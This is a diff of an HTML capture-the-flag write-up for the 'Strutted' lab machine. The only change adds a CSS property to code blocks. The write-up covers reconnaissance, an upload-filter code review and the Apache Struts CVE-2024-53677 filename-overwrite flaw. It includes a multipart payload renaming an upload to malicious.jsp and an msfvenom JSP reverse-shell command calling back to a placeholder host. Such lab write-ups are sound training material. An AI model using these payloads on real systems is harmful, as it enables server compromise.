@@ -243,7 +243,7 @@
 <ul>
 <li>
 <p>Basic TCP Scan:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>nmap $box -Pn -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -267,7 +267,7 @@
 <ul>
 <li>
 <p><strong>In depth scan TCP</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
 </span></span><span style="display:flex;"><span>
@@ -301,7 +301,7 @@ Some minor additional information but not enought to pull us in a different dire
 <h4 id="whatweb">WhatWeb:</h4>
 <p>Lets run <a href="https://github.com/urbanadventurer/WhatWeb"  target="_blank" rel="noreferrer nofollow">WhatWeb</a>
  to see if I can glean some further information.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>whatweb http://$box | sed <span style="color:#e6db74">&#39;s/, /\n/g&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Output</span>
@@ -313,8 +313,8 @@ Some minor additional information but not enought to pull us in a different dire
 </span></span><span style="display:flex;"><span>nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>ERROR Opening: http://strutted.htb/ - no address <span style="color:#66d9ef">for</span> strutted.htb
 </span></span></code></pre></div><p>As we can see it auto redirects to <code>strutted.htb</code> but as we don&rsquo;t have this in our <code>/etc/hosts</code> it will not redirect properly. Let&rsquo;s add this to our <code>hosts</code> file and redo.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   strutted.htb&#34;</span> | sudo tee -a /etc/hosts
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.129.7.241 <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   strutted.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.129.7.241 <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>
 </span></span><span style="display:flex;"><span>IP<span style="color:#f92672">[</span>10.129.7.241<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>RedirectLocation<span style="color:#f92672">[</span>http://strutted.htb/<span style="color:#f92672">]</span>
@@ -345,14 +345,14 @@ Some minor additional information but not enought to pull us in a different dire
 </ul>
 <h4 id="dirbusting-the-webserver-running-using-ffuf">Dirbusting The Webserver Running Using FFUF:</h4>
 <p>We can perform some directory busting to see if there are any interesting directories:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$domain/FUZZ -fs <span style="color:#ae81ff">5197</span> -ic
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$domain/FUZZ -fs <span style="color:#ae81ff">5197</span> -ic
 </span></span></code></pre></div><p>Only the listed pages were found:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>about                   <span style="color:#f92672">[</span>Status: 200, Size: 6610, Words: 2173, Lines: 182, Duration: 391ms<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>about                   <span style="color:#f92672">[</span>Status: 200, Size: 6610, Words: 2173, Lines: 182, Duration: 391ms<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>download                <span style="color:#f92672">[</span>Status: 200, Size: 39680602, Words: 0, Lines: 0, Duration: 0ms<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>how                     <span style="color:#f92672">[</span>Status: 200, Size: 6119, Words: 2054, Lines: 182, Duration: 417ms<span style="color:#f92672">]</span>
 </span></span></code></pre></div><h4 id="subdomain-enumeration-with-ffuf">Subdomain Enumeration with FFUF:</h4>
 <p>Let&rsquo;s enumerate any possible subdomains with ffuf.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$domain -H <span style="color:#e6db74">&#34;Host:FUZZ.</span>$domain<span style="color:#e6db74">&#34;</span> -ic -fs <span style="color:#ae81ff">5197</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$domain -H <span style="color:#e6db74">&#34;Host:FUZZ.</span>$domain<span style="color:#e6db74">&#34;</span> -ic -fs <span style="color:#ae81ff">5197</span>
 </span></span></code></pre></div><h4 id="enumerating-injection-points-with-burpsuite">Enumerating Injection Points With Burpsuite:</h4>
 <ul>
 <li><strong>Web Enumeration via Burp Suite</strong>:
@@ -408,7 +408,7 @@ We can see these should work on the endpoints:</p>
 <p>Here&rsquo;s how it works: dependencies are pulled in and used during a build stage, and once the application or binary is built, only the necessary output (e.g. the built binary) is copied into the final runtime stage. This means all the build-time dependencies can be excluded from the final image—resulting in a smaller, cleaner, and more efficient container.</p>
 <h4 id="examination-of-the-dockerfile-build-stage">Examination of the <code>Dockerfile</code> Build Stage:</h4>
 <p>As this is a multistage build we can break this down into the two stages so we can get a better understanding of what is happening with the creation of the image.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">--platform=linux/amd64</span> openjdk:17-jdk-alpine<span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">--platform=linux/amd64</span> openjdk:17-jdk-alpine<span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#FROM openjdk:17-jdk-alpine</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> apk add --no-cache maven<span style="color:#960050;background-color:#1e0010">
@@ -430,7 +430,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 <p><strong>Summary</strong>: In this stage the source code that is contained in the <code>strutted</code> folder in the root directory of this download folder is copied into the docker image and compiled using <code>maven</code> so that it generates a file called <code>strutted-1.0.0.war</code></p>
 <h4 id="examination-of-the-dockerfile-run-stage">Examination Of The <code>Dockerfile</code> Run Stage:</h4>
 <p>This section is primarily focused on copying, moving &amp; deleting files as well as starting the program.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">tomcat:9.0</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">tomcat:9.0</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> rm -rf /usr/local/tomcat/webapps/<span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/<span style="color:#960050;background-color:#1e0010">
@@ -503,7 +503,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 <h3 id="side-quest-what-is-maven">Side Quest: What is Maven?</h3>
 <p>I know, I know, another side quest. But really, it&rsquo;s important to understand what Maven is. As you saw it was used in the build stage of the Dockerfile to generate a <code>.war</code> file. That&rsquo;s because it&rsquo;s being used to manage, package, and build this application. So without at least a basic knowledge of Maven, where to find things and the terminology it uses, this next part won&rsquo;t make much sense.</p>
 <p>Maven provides a standardized way to structure projects, for example, all Maven projects follow the same standardized &amp; enforced folder layout.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>my-maven-project/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>my-maven-project/
 </span></span><span style="display:flex;"><span>├── pom.xml                  <span style="color:#75715e"># The Maven configuration file (Project Object Model)</span>
 </span></span><span style="display:flex;"><span>├── src/
 </span></span><span style="display:flex;"><span>│   ├── main/
@@ -521,14 +521,14 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 <p>As discussed earlier, the <code>pom.xml</code> file is essentially the roadmap Maven uses to run its build process. You can think of it kind of like a <code>Dockerfile</code>, it defines all the dependencies, plugins, and configuration needed to build the project.</p>
 <p>However, unlike a <code>Dockerfile</code>, which always results in a container image, Maven gives you more flexibility. In Maven, you declare the type of artifact you want to produce, remember this artifact is just the build output. It could be a <code>.jar</code>, <code>.war</code>, <code>binary</code>, or even a directory structure depending on how the project is configured.</p>
 <p>In this <code>pom.xml</code> we can see on lines 5-9 the artifact being generated when maven runs is a file called <code>strutted</code> it will be version <code>1.0.0</code> and it will be a <code>.war</code> file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;packaging&gt;</span>war<span style="color:#f92672">&lt;/packaging&gt;</span> <span style="color:#75715e">&lt;!-- artifact filetype --&gt;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>strutted<span style="color:#f92672">&lt;/artifactId&gt;</span> <span style="color:#75715e">&lt;!-- artifact name --&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.strutted.htb<span style="color:#f92672">&lt;/groupId&gt;</span> <span style="color:#75715e">&lt;!-- Organization/Company Name --&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>1.0.0<span style="color:#f92672">&lt;/version&gt;</span> <span style="color:#75715e">&lt;!-- artifact version --&gt;</span>
 </span></span></code></pre></div><p>This artifact is then referenced in line 17 of the <code>Dockerfile</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">COPY</span> --from<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war<span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">COPY</span> --from<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war<span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><h4 id="comparison-between-dockerfile-and-pom-dot-xml">Comparison Between <code>Dockerfile</code> &amp; <code>pom.xml</code>:</h4>
 <p>If you&rsquo;re struggling to grasp the difference sometimes its useful to look the similarities. This comparison table can help.</p>
 <table>
@@ -590,7 +590,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 <code>&quot;image/gif&quot;</code></p>
 <p>If the file matches one of these types, the function returns <code>true</code> and allows the upload to proceed. Otherwise, it returns <code>false</code>, effectively blocking the file.</p>
 <p>This presents a potential attack vector, because MIME types (also known as content types) can be manipulated during the upload process. For example, we could upload a malicious file and simply spoof the <code>Content-Type</code> header to appear as <code>&quot;image/jpeg&quot;</code>, potentially bypassing this check if there&rsquo;s no further validation (e.g., inspecting file contents or extensions).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isAllowedContentType</span>(String contentType) {
 </span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> allowedTypes <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;image/jpeg&#34;</span>, <span style="color:#e6db74">&#34;image/png&#34;</span>, <span style="color:#e6db74">&#34;image/gif&#34;</span>};
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (String allowedType : allowedTypes) {
@@ -614,7 +614,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 <ul>
 <li>+Note+: The JPEG &amp; PNG check only check the first 3 bytes whereas the GIF checks upto the first 8 bytes.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImageByMagicBytes</span>(File file) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> header <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>8<span style="color:#f92672">]</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> (InputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(file)) {
@@ -649,7 +649,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 <p>+Note+: If you&rsquo;re not interested in the breakdown of the code there is a TLDR at the end.</p>
 <p>Looking at the code <code>Upload.java</code> file again we can also see that from line 56-82 it details where files are uploaded &amp; their naming convention.</p>
 <p>We will break it down again so it is easier to digest and understand.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        String baseUploadDirectory <span style="color:#f92672">=</span> System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;user.dir&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/webapps/ROOT/uploads/&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        String baseUploadDirectory <span style="color:#f92672">=</span> System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;user.dir&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/webapps/ROOT/uploads/&#34;</span>;
 </span></span><span style="display:flex;"><span>        File baseDir <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(baseUploadDirectory);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>baseDir.<span style="color:#a6e22e">exists</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>baseDir.<span style="color:#a6e22e">mkdirs</span>()) {
 </span></span><span style="display:flex;"><span>            addActionError(<span style="color:#e6db74">&#34;Server error: could not create base upload directory.&#34;</span>);
@@ -675,7 +675,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        String timeStamp <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SimpleDateFormat(<span style="color:#e6db74">&#34;yyyyMMdd_HHmmss&#34;</span>).<span style="color:#a6e22e">format</span>(<span style="color:#66d9ef">new</span> Date());
 </span></span><span style="display:flex;"><span>        File timeDir <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(baseDir, timeStamp);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>timeDir.<span style="color:#a6e22e">exists</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>timeDir.<span style="color:#a6e22e">mkdirs</span>()) {
@@ -702,7 +702,7 @@ The command <code>mvn clean package</code> is run, which will tell maven to pull
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        String relativeImagePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> timeStamp <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> uploadFileName;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        String relativeImagePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> timeStamp <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> uploadFileName;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">imagePath</span> <span style="color:#f92672">=</span> relativeImagePath;
 </span></span><span style="display:flex;"><span>        String fullUrl <span style="color:#f92672">=</span> constructFullUrl(relativeImagePath);
 </span></span><span style="display:flex;"><span>
@@ -808,11 +808,11 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <h4 id="side-quest-what-is-ognl--object-graph-navigation-language">Side Quest: What is OGNL (Object-Graph Navigation Language)?</h4>
 <p>OGNL (Object-Graph Navigation Language) is a way for Apache Struts2 apps to access and manipulate Java objects (like properties, fields, methods) dynamically using string-based expressions. Basically it&rsquo;s a language that lets you walk through Java objects and their properties using dot notation, like a map or a path.</p>
 <p>Imagine you have an object like this in Java</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>user.<span style="color:#a6e22e">getAddress</span>().<span style="color:#a6e22e">getCity</span>();
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>user.<span style="color:#a6e22e">getAddress</span>().<span style="color:#a6e22e">getCity</span>();
 </span></span></code></pre></div><p>In OGNL, that might look like</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>user.<span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">city</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>user.<span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">city</span>
 </span></span></code></pre></div><p>Apache Struts2 uses OGNL to automatically bind data from <code>HTTP</code> requests to backend Java objects. That means if a user submits a form field called <code>username</code>, OGNL might take that value and do the following.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>user.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;value from request&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>user.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;value from request&#34;</span>
 </span></span></code></pre></div><p>OGNL can do much more than just accessing values, it can also call methods, manipulate data, and even execute Java code &amp; that&rsquo;s where things get dangerous as if insecurely configured as it can give attackers dynamic access to server-side objects and methods.</p>
 <h4 id="side-quest-understanding-the-value-stack">Side Quest: Understanding the Value Stack:</h4>
 <p>The value stack is a stack of Java objects that Struts2 uses to process a web request. At the top of this stack is the current <code>Action</code> object; which holds all the request data and business logic. The value stack is a temporary memory shelf that the framework uses to handle each web request.</p>
@@ -827,7 +827,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <h4 id="here-s-why-all-this-that-matters-in-the-cve-2024-53677-vulnerability">Here&rsquo;s why all this that matters in the CVE-2024-53677 Vulnerability:</h4>
 <p>OGNL expressions in parameters (like <code>top.UploadFilename</code>) can reference the top of the value stack.</p>
 <p>This means if parameter filtering is too loose, an attacker can send something like the below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>    Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top.UploadFilename&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>    Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top.UploadFilename&#34;</span>
 </span></span><span style="display:flex;"><span>    maclicious.jsp
 </span></span></code></pre></div><p>Which tells Struts2 to set the <code>UploadFilename</code> property of the top object (your Action class) to <code>malicious.jsp</code></p>
 <p>That change is subtle, but what it does is overwrites the filename on the backend, even if the client uploaded a safe-looking file like <code>image.jpg</code>. This would rename <code>image.jpg</code> to <code>malicious.jsp</code> which means if you can then access the file you could potentially get RCE (remote code execution by having that file processed).</p>
@@ -837,7 +837,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>As we know the application expects an image to be uploaded as it does extension filtering &amp; also checks for magic bytes, we also know that Apache Struts, suffers from an OGNL &amp; vulnerability where we can directly manipulate the action object of the value stack so therefore we can upload a fake image by manipulating the magic bytes to match that of a real image (whilst still having a <code>.jpg .gif</code> etc extension) however we will  embed a java based reverse shell within the file. We can then modify the image extension by manipulating the Action Object and therefore (should) be able to get RCE.</p>
 <h4 id="creating-our-malicious-image-reverse-shell-with-msfvenom">Creating Our Malicious image/reverse-shell With <code>msfvenom</code>:</h4>
 <p>This part is we simply create take a <code>.jsp</code> reverse shell and rename by giving it the extension <code>.jpg</code> <code>.gif</code>. We can do this easily with msfvenom</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=[</span>yourIP<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=[</span>yourListeningPort<span style="color:#f92672">]</span> -f raw &gt; shell.jsp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=[</span>yourIP<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=[</span>yourListeningPort<span style="color:#f92672">]</span> -f raw &gt; shell.jsp
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-05-30-204127_.png">
 </figure>
 
@@ -857,12 +857,12 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <ol>
 <li>Run <code>hexdump</code> on a <code>jpg</code>:</li>
